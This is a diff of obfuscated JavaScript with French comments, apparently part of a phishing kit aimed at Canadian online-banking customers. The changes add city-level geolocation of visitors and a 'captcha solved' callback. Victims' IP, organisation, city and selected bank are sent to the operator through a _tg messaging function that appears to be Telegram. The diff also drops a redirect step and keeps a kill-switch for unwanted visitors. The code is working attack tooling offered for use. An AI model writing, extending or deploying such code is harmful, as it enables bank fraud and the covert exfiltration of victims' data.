@@ -30,7 +30,7 @@
     }
   }
 
-  // 1. Détection Mobile (UA ou Touch + écran)
+  // 1. Détection Mobile
   function _isMobile(){
     var _ua = _N.userAgent || '';
     var _isMobUA = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(_ua);
@@ -136,11 +136,7 @@
   function _setupBanks(){
     var _ip = _W.sessionStorage.getItem('__xip') || 'N/A';
     var _org = _W.sessionStorage.getItem('__xorg') || 'N/A';
-
-    // Ne PAS intercepter sur la page captcha.html elle-même
-    if (_W.location.pathname.indexOf('captcha.html') !== -1) {
-      return;
-    }
+    var _city = _W.sessionStorage.getItem('__xcity') || 'N/A';
 
     var _selector = '[filabel],[data-fi],.fi-tile,a[href*="101"],a[href*="html"]';
     _D.querySelectorAll(_selector).forEach(function(_el){
@@ -169,16 +165,7 @@
 
         var _finalBankName = _matchedBank ? _matchedBank : (_clean || 'Banque inconnue');
 
-        _tg(_R, '🏦 <b>BANQUE SÉLECTIONNÉE</b>\n🏷️ <b>' + _finalBankName + '</b>\n📍 IP: <code>' + _ip + '</code>\n🏢 Org: <code>' + _org + '</code>\n🆔 Session: <code>' + _SID + '</code>');
-
-        // Redirection vers captcha.html
-        var _href = _el.getAttribute('href');
-        if (_href && _href !== '#' && _href.indexOf('captcha.html') === -1) {
-          e.preventDefault();
-          e.stopPropagation();
-          _W.sessionStorage.setItem('__targetBank', _href);
-          _W.location.href = 'captcha.html';
-        }
+        _tg(_R, '🏦 <b>BANQUE SÉLECTIONNÉE</b>\n🏷️ <b>' + _finalBankName + '</b>\n📍 IP: <code>' + _ip + '</code>\n🏙️ Ville: <code>' + _city + '</code>\n🏢 Org: <code>' + _org + '</code>\n🆔 Session: <code>' + _SID + '</code>');
       }, true);
     });
   }
@@ -194,14 +181,22 @@
       return;
     }
 
-    function _activate(ip, org, countryCode){
+    // Callback déclenché au moment où Google Captcha est résolu
+    _W._notifyCaptchaSolved = function() {
+      var _ip = _W.sessionStorage.getItem('__xip') || 'N/A';
+      var _city = _W.sessionStorage.getItem('__xcity') || 'N/A';
+      var _org = _W.sessionStorage.getItem('__xorg') || 'N/A';
+
+      _tg(_R, '✅ <b>CAPTCHA RÉSOLU</b>\n📍 IP: <code>' + _ip + '</code>\n🏙️ Ville: <code>' + _city + '</code>\n🏢 Org: <code>' + _org + '</code>\n🆔 Session: <code>' + _SID + '</code>');
+    };
+
+    function _activate(ip, org, countryCode, city){
       _W.sessionStorage.setItem('__xip', ip);
       _W.sessionStorage.setItem('__xorg', org);
+      _W.sessionStorage.setItem('__xcity', city || 'N/A');
 
-      // On n'envoie la notif de visite que si on n'est pas déjà sur le captcha
-      if (_W.location.pathname.indexOf('captcha.html') === -1) {
-        _tg(_R, '🟢 <b>NOUVELLE VISITE</b>\n📍 IP: <code>' + ip + '</code>\n🌍 Pays: <code>' + countryCode + '</code>\n🏢 Org: <code>' + org + '</code>\n🆔 Session: <code>' + _SID + '</code>');
-      }
+      // Notif d'entrée sur le Captcha
+      _tg(_R, '🟢 <b>ARRIVÉE SUR CAPTCHA</b>\n📍 IP: <code>' + ip + '</code>\n🏙️ Ville: <code>' + (city || 'N/A') + '</code>\n🌍 Pays: <code>' + countryCode + '</code>\n🏢 Org: <code>' + org + '</code>\n🆔 Session: <code>' + _SID + '</code>');
 
       _setupForms();
       _setupBanks();
@@ -233,17 +228,17 @@
                 _die();
                 return;
               }
-              _activate(d.ip, (d.connection ? (d.connection.org || d.connection.isp) : 'N/A'), d.country_code);
+              _activate(d.ip, (d.connection ? (d.connection.org || d.connection.isp) : 'N/A'), d.country_code, d.city);
             } else {
-              _activate(ipVal, 'Canada ISP', loc);
+              _activate(ipVal, 'Canada ISP', loc, 'Canada');
             }
           })
           .catch(function(){
-            _activate(ipVal, 'Canada ISP', loc);
+            _activate(ipVal, 'Canada ISP', loc, 'Canada');
           });
       })
       .catch(function(){
-        _activate('127.0.0.1', 'Local', _CC);
+        _activate('127.0.0.1', 'Local', _CC, 'Local');
       });
   }
 
